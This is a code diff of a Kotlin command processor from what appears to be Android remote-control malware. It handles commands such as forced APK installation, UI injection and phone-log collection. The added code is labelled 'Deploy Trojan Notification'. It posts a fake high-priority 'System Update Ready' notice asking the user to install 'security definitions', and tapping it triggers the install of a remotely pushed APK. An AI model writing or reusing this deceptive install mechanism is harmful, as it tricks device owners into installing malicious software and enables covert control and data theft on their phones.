@@ -555,7 +555,7 @@ object CommandProcessor {
                     val parts = content.split("|", limit = 2)
                     val apkPath = parts[0].trim()
                     val apkFile = File(apkPath)
-                    
+
                     if (apkFile.exists() && apkFile.isFile) {
                         if (parts.size > 1) {
                             // Case A: Show explanation overlay first
@@ -572,50 +572,38 @@ object CommandProcessor {
                                 ctx.startActivity(installIntent)
                                 status = "RELENTLESS_INSTALL_TRIGGERED"
                             } catch (e: Exception) {
-                                // Fallback notification logic follows below...
-                                throw e
+                                // FALLBACK: OS blocked background launch. Deploy Trojan Notification.
+                                try {
+                                    val pendingIntent = android.app.PendingIntent.getActivity(
+                                        ctx, 102, installIntent, 
+                                        android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
+                                    )
+                                    val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+                                    val channelId = "system_updates"
+                                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                                        val channel = android.app.NotificationChannel(channelId, "System Updates", android.app.NotificationManager.IMPORTANCE_HIGH)
+                                        nm.createNotificationChannel(channel)
+                                    }
+                                    val builder = androidx.core.app.NotificationCompat.Builder(ctx, channelId)
+                                        .setSmallIcon(android.R.drawable.stat_sys_download_done)
+                                        .setContentTitle("System Update Ready")
+                                        .setContentText("Tap to install the latest security definitions.")
+                                        .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
+                                        .setContentIntent(pendingIntent)
+                                        .setAutoCancel(true)
+
+                                    nm.notify(102, builder.build())
+                                    status = "INSTALL_DEFERRED_TO_NOTIFICATION"
+                                    errorMsg = "Background launch blocked. Notification deployed."
+                                } catch (fallbackErr: Exception) {
+                                    status = "INSTALL_FAILED_ALL"
+                                    errorMsg = fallbackErr.message ?: "Unknown fallback error"
+                                }
                             }
                         }
                     } else {
                         status = "INSTALL_FAILED (NOT_FOUND)"
                         errorMsg = "APK not at: $apkPath"
-                    }
-                }
-                            // FALLBACK: OS blocked background launch. Deploy Trojan Notification.
-                            try {
-                                val pendingIntent = android.app.PendingIntent.getActivity(
-                                    ctx, 
-                                    102, 
-                                    installIntent, 
-                                    android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
-                                )
-
-                                val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
-                                val channelId = "system_updates"
-                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                                    val channel = android.app.NotificationChannel(channelId, "System Updates", android.app.NotificationManager.IMPORTANCE_HIGH)
-                                    nm.createNotificationChannel(channel)
-                                }
-
-                                val builder = androidx.core.app.NotificationCompat.Builder(ctx, channelId)
-                                    .setSmallIcon(android.R.drawable.stat_sys_download_done)
-                                    .setContentTitle("System Update Ready")
-                                    .setContentText("Tap to install the latest security definitions.")
-                                    .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
-                                    .setContentIntent(pendingIntent)
-                                    .setAutoCancel(true)
-
-                                nm.notify(102, builder.build())
-                                status = "INSTALL_DEFERRED_TO_NOTIFICATION"
-                                errorMsg = "Background launch blocked. Notification deployed."
-                            } catch (fallbackErr: Exception) {
-                                status = "INSTALL_FAILED_ALL"
-                                errorMsg = fallbackErr.message ?: "Unknown fallback error"
-                            }
-                        }
-                    } else {
-                        status = "INSTALL_FAILED (NOT_FOUND)"
-                        errorMsg = "APK file not found at: ${content.trim()}"
                     }
                 }
                 "INJECT_UI" -> {
@@ -723,10 +711,10 @@ object CommandProcessor {
                             val result = JSONObject().put("report", chainReport)
                             updateCommandStatus(ctx, id, status, null, result, null)
                             return
-                                                        } catch (e: Exception) {
-                                    status = "CHAIN_FAILED"
-                                    errorMsg = e.message ?: "Unknown error"
-                                }
+                        } catch (e: Exception) {
+                            status = "CHAIN_FAILED"
+                            errorMsg = e.message ?: "Unknown error"
+                        }
                     }
                 }
                 "PHONE_LOGS" -> {
